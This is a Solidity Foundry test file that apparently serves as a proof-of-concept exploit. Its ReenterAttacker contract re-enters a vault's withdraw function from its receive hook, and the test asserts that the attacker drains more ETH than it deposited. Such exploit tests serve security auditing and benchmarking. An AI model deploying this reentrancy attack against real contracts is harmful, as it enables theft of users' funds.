// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract ReenterAttacker {
    ReentrancyVault public v;
    uint256 public loops;

    constructor(address vault) { v = ReentrancyVault(vault); }

    function attack() external payable {
        v.deposit{value: msg.value}();
        v.withdraw(msg.value);
    }

    receive() external payable {
        if (loops < 1) {
            loops++;
            v.withdraw(msg.value);
        }
    }
}

contract Exploit_001_reentrancy_vault is Test {
    ReentrancyVault vault;
    ReenterAttacker attacker;

    function setUp() public {
        vault = new ReentrancyVault();
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 5 ether}();
        attacker = new ReenterAttacker(address(vault));
        vm.deal(address(attacker), 1 ether);
    }

    function testExploit_ReentrancyDrainsBeyondDeposit() public {
        uint256 beforeBal = address(attacker).balance;
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();
        assertGt(address(attacker).balance, beforeBal + 1 ether, "attacker should extract extra ETH via reentrancy");
    }
}
